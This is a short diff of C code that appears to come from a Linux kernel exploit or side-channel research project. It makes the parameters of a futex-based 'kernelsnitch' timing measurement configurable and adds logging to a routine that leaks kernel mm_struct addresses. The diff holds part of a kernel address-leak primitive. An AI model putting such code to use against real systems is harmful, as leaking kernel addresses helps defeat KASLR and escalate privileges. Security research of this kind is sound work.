@@ -1089,7 +1089,13 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
     if (!state) {
       return -1;
     }
+#if defined(CONTROLLED_KSNITCH_APPENDED_FUTEXES) && \
+    defined(CONTROLLED_KSNITCH_REPEAT)
+    kernelsnitch_set_profile(state, CONTROLLED_KSNITCH_APPENDED_FUTEXES,
+                             CONTROLLED_KSNITCH_REPEAT, AVERAGE);
+#else
     kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
+#endif
 #ifdef QEMU_MM_TRACE_VALIDATE
     uintptr_t oracle_mm = 0;
     if (!qemu_mm_trace_drain()) {
@@ -1200,15 +1206,22 @@ static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
     size_t slot;
     size_t group = max_groups;
     int hint_hit;
-    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);
+    int fd;
+    pr_info("controlled mm scan attempt=%lu hint=%016zx\n", attempt, hint);
+    fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);
 
     if (fd == -2) {
+      pr_warning("controlled mm leak miss attempt=%lu hint=%016zx\n",
+                 attempt, hint);
       continue;
     }
     if (fd < 0) {
       break;
     }
     if (!controlled_mm_valid(mm)) {
+      pr_warning("controlled mm invalid leak attempt=%lu mm=%016zx zone=%s hint=%016zx\n",
+                 attempt, mm,
+                 controlled_mm_zone_name(controlled_mm_zone_of(mm)), hint);
       SYSCHK(close(fd));
       continue;
     }
